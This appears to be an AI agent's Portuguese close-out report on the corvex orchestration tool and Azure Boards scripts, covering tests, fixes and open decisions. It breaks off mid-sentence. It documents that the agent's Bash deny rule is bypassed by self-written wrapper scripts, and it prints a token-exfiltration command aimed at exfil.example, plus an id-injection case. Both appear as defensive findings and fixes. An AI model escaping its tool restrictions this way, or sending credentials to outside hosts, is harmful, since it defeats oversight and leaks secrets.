# Fechamento do rebrand — o que fechou, o que virou registro, o que é seu

> 2026-08-19. Executa `prompt-fechamento.md`. Dois repositórios: o binário (`~/projects/corvex`)
> e o domínio (`~/projects/yandeh/smartcare`), porque o invariante 4 não deixa os dois no mesmo
> lugar.

> ## ⚠️ ERRATA — 2026-08-19, sessão seguinte. Leia antes do resto deste arquivo.
>
> Este documento foi escrito 4 commits antes de `8c6c1af` e **envelheceu em pontos que
> mudam a decisão de quem lê**. O que está errado, medido em `8c6c1af` (corvex) e
> `57b17f98` (smartcare):
>
> | o doc diz | medido agora |
> |---|---|
> | cobertura combinada **82,6 %** | **82,9 %** |
> | `test.sh` do smartcare: **205 / 205** | **433 passaram, 0 falharam** |
> | "rode `go install`, o binário é de 29/06" | **já está feito** — `~/go/bin/corvex` traz `vcs.revision=8c6c1af`, `vcs.modified=false` |
> | `gofmt -l` (implícito, herdado da F0) | **vazio** — o último arquivo (`e2e/corvex_test.go`) foi formatado |
>
> E **três dos quatro itens de "o que eu faria a seguir" já foram feitos**: a sexta tool
> (`az-edit-workitem.sh`, `f75e6952`), os defeitos do `az-transition-plan.sh` (anotados e em
> parte consertados), e o `CORVEX_RUN_ID` (`59c6f45`). O item que **segue aberto** é o 3 — o
> `pr-review.sh` que engole falha de escrita do PR Status —, e ele é decisão do Giovanni,
> não conserto livre: mudar isso muda a superfície de erro do gate inteiro.
>
> O item 4 (`gate audit` com população) segue sendo a única mitigação que melhora sozinha
> com o tempo. Hoje: 3 gates em 12 repositórios, nenhum com gap zero. n=3 ainda não diz nada.
>
> **A tabela de invariantes abaixo, e a seção "Um obstáculo operacional", ficam como
> registro do que era verdade naquele commit — não como instrução.** O estado corrente
> está em `prompt-continuacao.md`.

---

**A resposta desconfortável primeiro, e ela é pior do que "faltou fechar":** onde a fronteira do
`az` fechou, ela é **lombada, não muro**. Medido contra o provider real com
`--disallowedTools "Bash(echo:*)"`:

| tentativa | resultado |
|---|---|
| `echo alfa` | **bloqueado** |
| `FOO=1 echo beta` | **bloqueado** — prefixo de env não escapa do matcher |
| `./wrap.sh`, um script que chama `echo` | **permitido** |
| o agente **escreve** `meu.sh` com `echo delta`, `chmod +x`, e roda | **permitido** |

O padrão casa o **nome do comando invocado**, não o comportamento transitivo. A terceira linha é
por desenho — é assim que a tool sancionada continua chamável. A quarta é o limite: o worker
escreve o próprio wrapper, porque a única escrita que ele não pode fazer é em `.corvex/**`.

Isso **reordena as duas peças da F9**: quem guarda a credencial é o `runner_only_env` (o segredo
não está no ambiente, e nenhum wrapper inventa o que não foi herdado), não o `disallowed_tools`,
que molda o caminho padrão e transforma "shellar" numa decisão visível em vez de um reflexo. Vale,
e é diferente de garantir. **A metade que de fato protege é a que você adiou** — ligar o
`disallowed_tools` sem virar o default do `runner_only_env` é fechar a porta e deixar a chave na
mesa. Registrado em `f9-custodia.md`, corrigindo a frase daquele registro que dizia que sem
`disallowed_tools` "o agente simplesmente shella": ele ainda shella, com um passo a mais.

E, além disso, a fronteira **não fechou inteira**: ligar `Bash(az:*)` quebra um caminho real —
**ler** o board a partir de uma task de worker. Está em letras grandes no `config.yaml` de lá, com
as saídas. É a diferença entre "verificado que fecha" e "verificado que quebra, e eu sei onde": o
segundo é o que temos.

---

## Invariantes — medidos no fim, não presumidos

| | Antes (`13381d0`) | Depois |
|---|---|---|
| `go test ./...` (corvex) | verde | verde, 22 pacotes |
| `scripts/flow/test.sh` (smartcare) | 56 / 56 | **205 / 205** |
| domínio em `.go` (4a) | vazio | vazio |
| `strings` do binário (4b) | 0 | 0 |
| cobertura combinada (piso **60**) | 82,1 % | **82,6 %** |
| cobertura `cmd/` isolada | 81,7 % | — |

O invariante 2 (cobertura) não está no `prompt-fechamento.md`, mas está no roadmap, e o roadmap
diz que as travas de lá **vencem** qualquer instrução de prompt. Medido nos dois lados: o piso é
do combinado, e medir só `cmd/` seria medir o lugar que a F0 esvaziou.

Invariante 4 do repo do smartcare — *"mudou a regra, mudou a tool E o teste"* — foi cumprido caso
a caso: **149 casos novos** no `test.sh` (56 → 205), e cada conserto teve o **controle negativo**
rodado: mutar a implementação e mostrar o teste ficando vermelho, com a saída literal dos dois
lados. Isso não é zelo — é a lição do `967aedba`, abaixo: um teste que continua verde com a
implementação mutada não testa nada.

---

## 1. O corvex está no ar

`git push origin main` → `578b3f9..13381d0`, 52 commits, fast-forward puro. Autorizado
explicitamente. Era a única ação outward da lista, e é o que torna todo o resto visível.

## 2. Tools de escrita do board — e a fronteira que ficou meio fechada

Cinco tools novas em `scripts/flow/`, tier 2 (falam rede, jq e token AAD):
`az-create-workitem.sh` (cria **já com o pai**, numa chamada — o `create` + `relation add` deixa
órfão), `az-comment.sh` (HTML, `api-version=7.0-preview.3`), `az-transition.sh` (um degrau por
chamada, consumindo o plano), `az-validate-transition.sh` (a sonda `validateOnly`) e
`az-show-workitem.sh` (leitura). Mais a recipe `.corvex/recipes/board.yaml`, validada pelo
binário.

**O contrato do tier 2 teve de ser inventado antes das tools.** O `README.md` de `scripts/flow`
declarava *"sem node, npm, jq ou rede"* e um `test.sh` offline; quatro tools de escrita em rede
quebram isso frontalmente. Sem definir o tier, o catálogo teria ganhado tools que **nenhum teste
toca**, num diretório cujo argumento inteiro é "prosa não tem exit code". O contrato ficou:
`--dry-run` obrigatório imprimindo o payload exato sem tocar a rede (é o que devolve
testabilidade offline, e é onde os bugs de verdade moram — o `$` antes do tipo, o `-preview.3`,
`op:replace` em Tags), sonda antes de toda escrita, e **exit 3 para falha de API**: mapear
`TF401320`/403/502 para exit 1 faria o chamador ler infra como decisão de política.

Dois gotchas viraram guarda com exit code, não parágrafo:
- **A sonda detecta pela `.message`, nunca por `.id`.** A resposta de `validateOnly` não traz
  `.id`, então `jq -e '.id'` dá falso-negativo em **tudo** (mordeu na GMUD 1.4). Está proibido no
  comentário do script e coberto por fixture sem `.id`.
- **`via: human-ui` é gate de primeira classe, não metadado.** `plan --json` sai com **exit 0**
  mesmo quando um degrau é humano; uma tool escrita como `plan --json && executa` faria PATCH de
  `Bug → Closed`, que o workflow recusa. A tool para **antes de qualquer degrau**, inclusive os
  `cli` anteriores: executar parcialmente até o degrau humano deixa o item num estado
  intermediário sem quem o termine.

**O que a fronteira ainda não fecha.** As tools cobrem escrita e leitura de work item. Se sobrar
operação de board que o worker execute e nenhuma tool cubra (`az boards query --wiql` é a
candidata), ela bate na proibição. O `config.yaml` carrega a lista honesta e a instrução de não
apagá-la quando um run bater. **Ligar sabendo onde quebra é diferente de ligar e torcer** — mas é
menos do que a própria F9 exigiu para ligar (*"aí `Bash(az:*)` fecha **sem quebrar nada**"*).

## 3. Os buracos das tools — e o teste que não mordia

O item que mais rendeu, e não pelo motivo esperado.

**`az-transition-plan.sh`: o arm morto.** Confirmado inalcançável por dois motivos independentes.
O efeito é que a tool **ainda emitia hoje** a razão que o `967aedba` veio corrigir — o `case`
engoliu a correção num arm que nunca executa. Consertado, com a razão medida no Bug #62699.

**A causa, que é maior que o sintoma:** `check` no `test.sh` fazia `2>/dev/null`. **Nenhuma das
56 checagens testava a razão de uma recusa** — e "motivo em stderr" é metade do contrato
declarado do diretório. Foi por esse vão que o `967aedba` passou 56/56 trocando uma mensagem que
não trocou. Entrou o helper `check_err`, e o comentário dele diz exatamente isso. Mais o trio de
casos que faltou no `967aedba` (`Feature Testes → Deploy`), incluindo o que **pina o `via`**, que
é o que trava a regressão de verdade.

**Os quatro GUIDs `-INCOMPLETO` morreram.** Eram reticências literais na prosa
(`Custom.3ef8a79a-…`), e por isso toda transição de Bug e `Incident → QA` saía com ref falso.
Medidos contra a org real (`workitemtypes/<tipo>/fields`, filtrando `alwaysRequired`) e conferidos
uma segunda vez pelo agente que os aplicou — um GUID errado seria **pinado pelo teste e ficaria
verde**, que é a mesma classe de falha do `967aedba` um nível abaixo:

| ref | campo |
|---|---|
| `Custom.3ef8a79a-f1bb-4609-9cd4-0c252517fa6c` | Houve reincidência |
| `Custom.a5c5ea7e-7a83-4303-b5a3-d8adfe99521e` | Automação |
| `Custom.88184e68-bffd-446a-ab65-e7f70cacef12` | GMUDRecente |
| `Custom.2d6a77b7-fe5b-439a-a7fa-c94c47066127` | Cenário havia sido validado em QA |

**`ship-target.sh`: o briefing estava parcialmente errado, e o buraco real era outro.**
`backmerge/*` **é** conhecida e a recusa é deliberada e correta — a evidência do `origin` confirma:
**seis grafias distintas** para o eixo `develop`, e numa delas o eixo está *no meio* do nome. Um
parser de nome erraria o eixo, e back-merge no eixo errado re-apresenta conflito já resolvido.
O que estava errado ali era o glob `chore/backmerge-*`, que **perdia 3 das 5** branches reais
(escrevem `back-merge`, com hífen) — e o que se perdia não era o exit code, era o aviso
*"NUNCA squash"*.

E o buraco maior que os três nomeados: os globs `feat/[0-9]*` e `feature/[0-9]*` exigiam dígito
depois da barra, jogando **33 branches** do `origin` em "classe desconhecida" — inclusive a mais
recente do conjunto. Os dígitos não compravam segurança nenhuma: quem determina o target é o
argumento obrigatório. `chore/*` virou três arms (não é uma classe, são três papéis com o mesmo
prefixo) e `ci/*` exige `--target` explícito, porque as três branches `ci/*` do `origin` são o
**mesmo commit cortado de três bases** — uma mudança com N targets, que o modelo "uma branch, um
target" não representa. O `--target` tem guarda-rail testado: só é aceito onde não há resposta
autoritativa, senão vira o default silencioso que este repo já matou uma vez.

**`pr-review.sh`: o 🟡 não faltava na tool — faltava o produtor.** `ship-may-vote.sh` já aceitava
`approved-with-suggestions`, com teste. Quem achatava era o `pr-review.sh` (dois sentinelas) e
o **placeholder** na prosa da `/ship`, que fazia o *agente* preencher o verdict pela leitura —
derrubando o próprio título do passo ("pergunte à tool, não à sua leitura"). Agora: três
sentinelas de tokens disjuntos (`APROVADO COM RESSALVAS` cai em `blocked`, não em `approved` —
a armadilha de substring tem teste), rubrica que define ATENCAO **por exclusão**, `--emit-verdict`
imprimindo só o token, e classificação fail-closed.

## 4. Dívidas da F7 — as quatro que você marcou

Registrei minha objeção na hora e sigo achando que três delas eram mecanismo novo, não conserto.
Foram feitas assim mesmo, com o escopo mínimo que fecha o item:

- **CSP** (`3ea1ff7`) — política restritiva **sem nenhum `unsafe-inline`**. O trabalho não foi a
  política, foi a página caber nela: o `app.js` escrevia **atributo** `style` em três pontos, e
  sob `style-src 'self'` a barra de custo por natureza apagaria **em silêncio**. Consertamos a
  página (CSSOM em vez de atributo), não a política. De brinde: o ponto de composição do handler
  estava **duplicado** — o próximo handler nasceria sem header.
- **SSE** (`8319afc`) — `GET /api/events` atrás da mesma auth, com heartbeat e dedup por
  impressão digital. **E não virou push**, o que está escrito em três lugares: o servidor
  supervisiona runs e nunca é dono deles, então não há evento em memória. O poll **trocou de
  lado** — latência de tela de 5s para 1s, 12 requisições/min para uma conexão, e 5× mais leitura
  de disco por página aberta. `fsnotify` não resolveria: a mudança que mais importa (um run que
  morreu) **não escreve nada em disco**.
- **`gate answer`** (`a450a4f`) — o eixo invertido ganhou substrato: natureza `question`, no mesmo
  arquivo e mesma escrita atômica, com a resposta num campo novo e opcional. A decisão de desenho
  que importa: **o veredito não ganhou um quarto valor** (responder é `approved`, recusar é
  `reject`, ninguém responder é `expired`), porque um `answered` quebraria o invariante em que o
  `gate audit` se apoia. O caminho "óbvio" era o que estragava o trabalho vizinho.
- **`run pause`** (`5d03e80`) — o desenho já estava escrito na D13 e foi implementado como estava:
  arquivo de controle + leitura **na barreira de onda**, antes do `expandFanouts`. Pausar dentro
  do step mataria chamada de provider já paga. `paused` entra no eixo de **status**, não no de
  liveness: o processo está de pé; o que mudou é o que o run reporta de si.

**A quinta dívida — "um repositório por servidor" — continua aberta** e não por acaso: as outras
quatro são mecanismo dentro de um processo; esta é escopo de produto.

## 5. Risco 1: o sensor sobre os sensores existe, e já disse algo

`corvex gate audit` (`fbc07f3`), mais `GET /api/gates/audit` (`498e8d5`) devolvendo o tipo de
`ops` verbatim.

**Ele lê o arquivo de gate, não o ledger — e a "coluna no `inspect --json`" está recusada por
escrito**, em três razões medidas: o ledger achata `rejected` e `expired` no mesmo `FAILED` (a
taxa de reprovação contaria abandono como julgamento — o falso negativo exato que o Risco 1 quer
evitar); `--approve-gates` emite duração zero, indistinguível de humano instantâneo num p50; e o
ledger não tem marca de leitura nenhuma.

**A métrica mais afiada não é a que o roadmap nomeia.** Latência mede almoço, sono e fuso. O que
separa carimbo de julgamento é o **gap leitura→decisão**: `gate.Decide` data a marca de um `--ack`
inline em `DecidedAt`, então gap **exatamente zero** identifica o caso de tecla única, e gap > 0
prova que houve um `gate ack` separado antes.

Duas recusas deliberadas: **nada de `p95` abaixo de n=20** (percentil sobre n=1 é teatro sobre
teatro), e **nenhum campo booleano `theatre` no JSON** — a fronteira dos "4s" é política, e
política em campo de dados vira fato falso; o corte vive em `--suspect-under`, visível em argv.

**O primeiro dado real** (`gate audit --all`, 6 repositórios varridos): 3 gates decididos, gaps de
8s, 10s e 3m — **nenhum decidido na mesma tecla**. Mas 100 % de aprovação sobre n=3, que é
exatamente a metade do Risco 1 que continua acesa. O sensor não fecha o risco; ele torna o risco
mensurável, que é o que faltava.

## 6. Achados menores

**Preflight consertado** (`28c9b90`) — e a narrativa também. `exec.LookPath` com nome que contém
barra **não busca no PATH**: faz `stat` contra o CWD do processo. Os dois lados quebravam
(falso-negativo recusando um run pronto; falso-positivo liberando e gravando no ledger um caminho
que não significa nada fora daquele CWD). **O cenário escrito no `f8-registro.md` — "num run com
worktree isolado" — não era o gatilho**: hoje toda rota de produção chega com `workDir == CWD`,
ou seja, acertava por **coincidência**. Registro que descreve o mecanismo errado é pior que
registro nenhum, porque manda o próximo leitor procurar no lugar errado; foi reescrito.

**`DisallowedTools` × MCP — a formulação estava imprecisa e o buraco é outro.** O mecanismo
*alcança* MCP se o padrão for nomeado (`DisallowedTools` vira `--disallowedTools` na CLI). O
buraco real: o bloqueio **embutido** dos arquivos de estado do corvex (`Edit(.corvex/**)`,
`Write(.corvex/**)`, `Bash(rm:.corvex/**)`, em `internal/step/worker.go`) está escrito no
vocabulário de tool do *provider*, e um servidor MCP com escrita em disco é **outro vocabulário**:
passa por baixo da porta que o corvex decidiu manter fechada por conta própria. Não é "ligar
`disallowed_tools` para MCP" — é que a proteção não-negociável do corvex tem um flanco.

**Contrato de contexto cross-repo:** continua aberto, sem trabalho nesta leva.

---

## O que virou REGISTRO em vez de conserto — e por quê

O invariante 5 diz que bug se anota. Estes são os que ficaram anotados, com o motivo:

1. **`az-transition-plan.sh`: dois defeitos de saída.** `states --type Feature` não emite newline
   final (consumidor com `while read` perde a última linha — hoje `Deploy`, justamente o degrau
   novo); e `from == to` com `--json` sai **sem** a chave `incomplete_refs` (schema instável entre
   dois caminhos da mesma flag). São uma linha cada, mas são **mudança de saída de tool já
   consumida**. A tool nova se defende (`.incomplete_refs // false`). Registrados no README.
2. **O harness de teste ainda não alcança formato.** O `check_err` resolveu o stderr; comparar
   *bytes* (o newline final) exigiria uma terceira forma de asserção. Não expandi o harness duas
   vezes na mesma tarefa.
3. **`evidence:` de stage computacional nunca é coletada.** `resolveDeclared` só é chamada pelo
   gate **humano** — e a `ship.yaml` do smartcare declara, no S06, evidência com
   `required_reading: true` sob gate computacional. **Ela anuncia uma trava de leitura que não
   está armada**, e essa trava é a mitigação escrita do Risco 1. Esse não ficou só registrado: virou
   conserto fail-closed no validador (§ *Consertados depois do primeiro fecho*).
4. **Dois gates humanos no mesmo step colidem em disco.** `gate.Path` é (run, step) e o `Open` é
   `O_EXCL`: o segundo mata o run com Fatal, e nada no validador proíbe. Também virou conserto no
   validador; crescer o caminho do arquivo com um índice foi **descartado por escrito**, porque
   mudaria formato em disco e gates já gravados deixariam de ser achados.
5. **`pr-review.sh` engole falha de escrita do PR Status.** As duas chamadas `az rest` usam
   `&& note …`: se gravar o status falhar, o erro some e a tool sai 0 — o gate diz "verde" sem ter
   gravado o status que a Branch Policy lê. É o achado mais sério do smartcare e **não** foi
   consertado: transformá-lo em falha muda a superfície de erro do gate inteiro (todo PR passaria a
   poder morrer por um 502 no comentário). É decisão de fronteira.
6. **A história do sensor é perecível.** O arquivo de gate vive em scratch gitignorado: nada o
   poda, nada o protege. Um `rm -rf .corvex/runs` apaga a história inteira, enquanto o ledger
   (commitado) sobrevive e é justamente o que não distingue rejeitado de expirado. Torná-la durável
   = chave nova no `activity.jsonl`, que entra no git do usuário.
7. **A autopilot não herdou o tradutor do 🟡.** Continua chamando `pr-review.sh` sem
   `--emit-verdict`, logo o agente dela ainda preenche o verdict pela leitura da prosa — o defeito
   exato que morreu na `/ship`. Mudar isso é mexer num orquestrador inteiro.
8. **`internal/ops/doctor_config.go` usa o mesmo `LookPath`** para o binário do provider. Não é o
   mesmo bug (ali o binário é do ambiente, e `workDir` não entra na conta), mas é o mesmo padrão.
9. **`alwaysRequired` que a escada não modela** (`ValueArea` em Bug/Feature/Story;
   `Enviadodiretoparaprod` na Story). `alwaysRequired` no **tipo** não é o mesmo que exigido para
   **entrar num estado** — adicionar sem sondar seria palpite que quebra degraus que hoje passam.

---

## O que continua esperando decisão sua

1. **A fronteira do `az` está meio fechada** — e agora a lista é exata. A quinta tool
   (`az-show-workitem.sh`) fechou a leitura de work item, mas **três operações de board seguem sem
   tool** e morrem em *tool not allowed* numa task de worker: (a) buscar por critério
   (`az boards query --wiql`); (b) **editar campo de item existente** — título, descrição, critérios
   de aceite, `IterationPath` (mover de sprint é isto); (c) `relation add` em item já criado. A (b) é
   a que dói: *"atualize a descrição da story #X"* é board, é tarefa de worker, e hoje para. Fora do
   eixo de board, a mesma proibição pega `az repos pr *`, que três skills mandam rodar —
   `disallowed_tools` é **global ao worker**, não por área.
   **Minha recomendação é NÃO desligar:** a falha é alta e imediata, o que fechou é o caminho
   perigoso (o mesmo shell que lê é o que escreve), e desligar reabre a credencial para tudo por
   causa de duas ou três operações que têm desvio. A sexta tool óbvia é `az-edit-workitem.sh`.
   O que me faria mudar de ideia: um run real precisando de (b) sem desvio e sem tempo de escrever a
   tool — porque não existe afrouxar um caso só.
2. **O 🟡 vota mas não auto-conclui.** `ship-may-complete.sh` passou a exigir `approved` estrito.
   Apliquei fechado, pela mesma natureza da decisão que você ratificou no `ship-may-vote.sh`, mas
   **é mudança de fronteira e espera ratificação**: PRs classificados 🟡 passam a esperar clique
   humano mesmo em `feature/<id>-*`. Reverter é um arm no `case`.
3. **`succeededWithIssues`.** Não deu para verificar offline se uma Branch Policy do Azure trata
   esse status como aprovação ou **reprovação**. Se for reprovação, usá-lo para o 🟡 viraria
   bloqueio duro — pior que hoje. Ficou `succeeded`. Um PR de teste com a policy ligada resolve.
4. **Durabilidade da história do gate** (registro 6 acima): chave nova no `activity.jsonl`.
5. **Chave de agregação do `gate audit`.** Hoje `(recipe, step_id)`. Sufixo de fan-out
   (`S06/003/apply`) **não** é colapsado — colapsar inventaria agrupamento que o disco não afirma.
   Se a sua intenção era "por gate declarado na recipe", a chave certa exige campo novo em disco.
6. **`gate answer`: `--text` vs `--choice`.** O roadmap esboça `--choice`; entreguei `--text`,
   porque escolha pressupõe um conjunto de opções declarado no gate — campo que não existe e que é
   decisão de schema. `--choice` continua expressível em cima disto, sem migração. E o nome
   (`gate answer` × `answer` no topo) continua na sua lista de decisões em aberto: implementei sob
   o nome já fixado, **sem alias**.
7. **Quem produz a pergunta.** Hoje é a *recipe*, não o agente. Para o worker perguntar no meio da
   execução falta mudar o protocolo do provider (`ExecuteResult` não tem como dizer "parei, preciso
   saber X", e `Worker.Execute` não tem ponto de retomada). Não mexi: é mudança de protocolo.
8. **Os dois defeitos de saída do `az-transition-plan.sh`** (registro 1). Uma linha cada; o que não
   é de uma linha é saber se algum consumidor já depende do formato atual.
9. **`pr-review.sh` engolindo falha de PR Status** (registro 5).
10. **`AZDO_REPO` ainda vem do ambiente.** Não move o token (o host virou constante, e o pior caso é
    404 no repo errado da *mesma* org), mas o `pr-review.sh` não chama `require_custody`, então é o
    único caminho em que o ambiente ainda escreve parte de uma URL que leva credencial AAD.
11. **A guarda de custódia recusa QUALQUER `$TOKEN` no ambiente** — e este repo usa esse nome como
    parâmetro documentado em quatro scripts de teste. Quem tiver `TOKEN` exportado verá as tools do
    board recusarem até rodar `env -u TOKEN`. Escolhi ruidoso: antes do conserto, aquele mesmo JWT
    ia no header `Authorization` para o `dev.azure.com`. Se preferir silêncio, é trocar `refuse` por
    ignorar — e aí o teste de recusa cai.
12. **Dois runs de `board` com entradas IDÊNTICAS ainda compartilham o diretório de estado.** Fecha
    de vez quando o corvex exportar um id de run para o ambiente do stage: hoje ele só exporta
    `CORVEX_RUN_BASE` (o commit). É **uma linha** em `internal/step/step.go`, e o `RunID` já existe
    em `RunIdentity` — é um pedido legítimo do smartcare ao corvex.
13. **Evidência inerte (sem `required_reading`) passa em silêncio.** Um aviso em `recipe validate`
    exigiria um canal de warning novo até o `cmd/`, que não existe.
14. **`json_value` deduz o tipo JSON da forma do valor** (crítico aberto do PR #41998).
    O conserto é um `type` por campo na tabela do `az-transition-plan.sh` com
    `json_value` chaveado por ele — muda o schema de `plan --json`, que está em
    produção. Está registrado no cabeçalho da função, com a medição.
15. **O teste de navegador pula quando não há Chrome na máquina.** Se a CI não tiver navegador, a
    metade de browser da suíte não prova nada lá.

---

## As quatro decisões que você tomou, e como foram aplicadas

| Decisão | Aplicada como |
|---|---|
| `ship-may-vote.sh` **ratificado fechado** | Nenhuma linha de código mudou — era o que já estava certo. Registrado aqui como ratificação, não como pendência. |
| §0b vs §7b: **consolidar preservando os dois exemplos** | O §7b foi absorvido pelo §0b: regra escrita uma vez, os dois exemplos mantidos. As **8 referências** a "§7b" nas tools e na recipe foram religadas para §0b — ponteiro quebrado seria pior que duplicação. |
| Base da feature branch: **cortar de `origin/<target>`** | `pilot-feature` e `dev-maestri` passam a resolver a base pela **mesma tool** que resolve o target, e param quando não há minor aberta. E 14 ocorrências de "feature→develop" na prosa viraram "feature→`<target>`" — era a mesma frase copiada em N lugares, que é como a contradição 1 da F8 nasceu. |
| Default da F9 no binário: **não virar** | Nada mudou no binário. A cadeia inteira ficou escrita: a F8 fechou → mas as tools de board só existiram agora → e mesmo agora a leitura ainda pede `az` cru. Fechado **por repo** no smartcare, não no default. |

Duas coisas que a consolidação do §0b consertou de passagem, porque estavam **dentro** da seção
consolidada e republicá-las erradas não fazia sentido: a URL base tinha duas grafias e uma dava
**404** (`_apis/wit` + `/wit/workitems`), e a sonda ensinada mandava só `System.State`, o que dá
**recusa falsa** em degrau com campo obrigatório — a `.message` diz "falta campo" e o leitor
conclui que a transição não vale.

---

## Consertados depois do primeiro fecho — o que a revisão adversarial achou

Depois de tudo verde, três agentes revisaram os 12 commits **tentando derrubá-los**, com ordem de
executar e não de ler: mutar cada conserto e verificar se o teste correspondente fica vermelho.
Valeu o custo. Nove achados verificados, e **três mudaram o resultado da entrega**.

### 1. A fronteira do `az` tinha **invertido de sinal** (bloqueava a entrega)

`AZDO_ORG` vinha do ambiente e ninguém o validava — `require_smartcare` só olhava `AZDO_PROJECT`.
E `Bash(az:*)` bloqueia o `az` cru, mas **não** bloqueia
`Bash(AZDO_ORG=... ./scripts/flow/az-show-workitem.sh --id 1)`. Ou seja: a tool sancionada derivava
o token AAD real por dentro e o entregava, no header `Authorization`, **ao host que o chamador
escolhesse**. Provado executando, com `curl` stubado:

```
env AZDO_ORG="https://exfil.example/coleta" ./scripts/flow/az-show-workitem.sh --id 62699
→ exit 0, Authorization: Bearer <token AAD>, para https://exfil.example/coleta/...
```

**Antes das tools o worker não tinha credencial nenhuma.** As tools existiam para que ele pedisse a
operação em vez do segredo, e o efeito era o contrário: um oráculo de exfiltração que a própria
proibição sancionava. Isto não é um bug das tools — é o modo de falha de *fronteira construída sem
teste que a prove negando*.

Consertado em **duas camadas** (`5831a000`), e as duas foram mutadas separadamente para provar que
não são redundância decorativa: `AZDO_ORG`/`AZDO_PROJECT` viraram **constantes literais** (o valor
que monta a URL não vem do ambiente), e uma guarda `require_custody` **recusa** quando o ambiente
tenta passar org, projeto ou credencial. Mais: `TOKEN="${TOKEN:-$(azdo_token)}"` (em duas tools)
deixava uma variável de nome genérico sequestrar o header — um `TOKEN` no shell do dev mandava
**aquele** segredo para o `dev.azure.com`. E quatro das cinco tools não validavam o id como
dígitos, então o chamador **escrevia a URL por argumento** (`--id '1?api-version=7.0&x=y'`).

### 2. A regra nova do validador parava **runs**, não só validações

`4febce0` recusava `evidence:` num stage sem gate que a lesse. Mas `Recipe.Compile()` chama
`Validate()`, e `corvex run` compila pela mesma porta: uma recipe **já escrita no disco do usuário**
deixava de **rodar**. A mensagem do commit dizia *"o runner não mudou"* — verdade sobre
`internal/step/`, falsa sobre o efeito.

Estreitada em `559cbba` para o que era o defeito real: **`required_reading: true`** onde ninguém lê.
Evidência declarada *sem* a marca é documentação inerte — chata, não perigosa, e não justifica
quebrar o arquivo de ninguém. A recusa **ficou** no `Validate()` de propósito, porque o caso que
sobra é justamente aquele em que o run não deve prosseguir: a recipe promete "alguém tem de ler
antes de aprovar" e não há quem aprove.

### 3. O SSE descartava evento e nunca o reentregava (regressão de produto)

Evento que chegava com uma **tela de detalhe aberta** era descartado — e a digital nova não era
guardada, e o poll de fallback ficava parado porque o stream estava vivo. Ao voltar, a página
renderizava cache. **A caixa de entrada podia mostrar indefinidamente um gate já aprovado como
pendente.** O poll incondicional de 5s curava isso em ≤5s antes de `8319afc`; e o comentário do
próprio código afirmava o contrário.

Consertado em `b01ab86` com `leaveDetail()` como única saída de detalhe — correto **por
construção**, não por bookkeeping. As duas soluções óbvias foram rejeitadas com argumento: uma
flag de "mudança pendente" não funciona porque **não sobra observador** para levantá-la enquanto o
detalhe está aberto, e "não consumir a digital" não funciona porque o servidor mantém `last` por
conexão e não reenvia. O teste roda um **Chrome headless real** contra o binário real, e o controle
negativo (app.js de `8319afc` no lugar) reproduz o sintoma de produto inteiro.

### O resto, consertado sem drama

- `az-transition.sh` **gravava um degrau e morria no meio da escada**: `required_fields` era checado
  *dentro* do loop, depois do PATCH anterior já ter saído — exatamente o estado intermediário que o
  cabeçalho jurava impossível. Virou duas passadas: valida o plano inteiro, e só então executa.
- A `board.yaml` usava um **ponteiro de estado de caminho fixo** (`$TMPDIR/corvex-board-last`): dois
  runs de board simultâneos cruzariam os fios e o S04 de um PATCHearia a work item do outro — e a
  escada não retrocede.
- Dois bugs na `board.yaml` achados pela quinta tool: faltava `set -o pipefail` (então
  `tool | tee` devolvia o exit do `tee` e o `set -e` **nunca via a recusa** — o gate do checklist §6
  era enfeite), e o S01 não conferia o pai.
- **Quatro testes que não mordiam** (mutante verde): o `--body` da sonda, a âncora `^` do
  classificador do `pr-review.sh`, e os arms `release/*`/`main` das duas tools de fronteira, que
  eram *message-only* — apagá-los caía no fallback que também recusa. Todos ganharam
  `check_err`/`check_err_absent`, que é o helper que mata a classe `967aedba`: quando dois caminhos
  recusam com o mesmo exit, **só a razão os separa**.
- `/assets/` servia o `index.html` inteiro (índice de diretório do `embed`) sem passar pelo
  `handleIndex`, logo sem cookie de sessão. E `el({style})` falhava calado com valor não-objeto.
- A linha `latency … (n=%d)` do `gate audit` imprimia a população julgada, não o tamanho da amostra
  — o doc da própria função chama isso de *"a lie of composition"*.
- O preflight afirmava no README distinguir "não está lá" de "está lá e não é executável", mas o
  branch de `ErrPermission` **nunca dispara para `bin:` sem barra**, que é o caso dominante (`bin: az`).

## Duas afirmações desta leva que a árvore não sustenta

O padrão da casa é corrigir o registro quando ele mente, não deixá-lo bonito:

1. **`359bc61` afirma "cobertura combinada 84,3% → 84,4%".** Não reproduz em nenhuma variação de
   `coverpkg` que eu tenha testado. O número real, com o `coverpkg` canônico do roadmap, é **82,6%**
   no fim desta leva (82,1% na partida). A mensagem do commit fica no histórico; o número certo fica
   aqui.
2. **A aritmética do SSE em `f7-registro.md` só contava o caso feliz** ("de 12 por minuto para uma
   conexão aberta"). Com o stream **caído**, a página faz ~42 req/min — mais do que o poll que ela
   substituiu. Corrigido no registro.

## Um obstáculo operacional que não é código

O binário instalado em `~/go/bin/corvex` é de **29 de junho** (`v0.1.0-dev`), anterior ao rebrand
inteiro: ele recusa `kind: test` e não tem `recipe validate` com dois argumentos. **As recipes que
entregamos no smartcare não rodam com ele.** Toda validação desta leva foi feita com um build do
fonte. Reinstalar:

```
cd ~/projects/corvex && go install .
```

## O gate de review no PR #41998 — sete rodadas, e o que elas mediram

O PR do smartcare (`chore/flow-tools → develop`, #41998) passou pelo próprio gate
de review por IA sete vezes. Vale registrar a curva, porque ela diz mais que os
consertos:

| rodada | 🔴 | origem dos críticos |
|---|---|---|
| 1 | 2 | da leva original |
| 2 | 3 | da leva original (1 era limitação do revisor, não defeito) |
| 3 | 1 | da leva original — `User Story` montava URL que o `curl` recusa |
| 4 | 2 | da leva original — a `ship.yaml` **mergeava PR bloqueado** |
| 5 | 4 | **1 introduzido pelo conserto da rodada 4** |
| 6 | 2 | **os 2 introduzidos pelo conserto da rodada 4** |
| 7 | 2 | 1 quinto sítio de classe conhecida, 1 dívida de contrato |

**A leitura desconfortável:** a partir da rodada 5, os consertos passaram a
introduzir defeitos no ritmo em que o gate os achava. O pior exemplo é meu: na
rodada 4 espalhei `set -euo pipefail` pelos sete stages da `ship.yaml` e escrevi
que tinha conferido os pipelines. Conferi dois e não enumerei o resto — e o que
passou foi `git diff --name-only | grep -q`, onde o `grep -q` fecha o pipe, o
produtor morre de SIGPIPE, o status vira 141 e **o aviso de MIGRATION desaparece
exatamente quando há migration**. Fail-open silencioso, num repo onde
`npm run migrate` é manual.

**O que sobrou de estrutural, e é o que paga:** a mesma classe — *"guarda escrita
onde o revisor apontou, não onde ela se aplica"* — apareceu em **seis** sítios ao
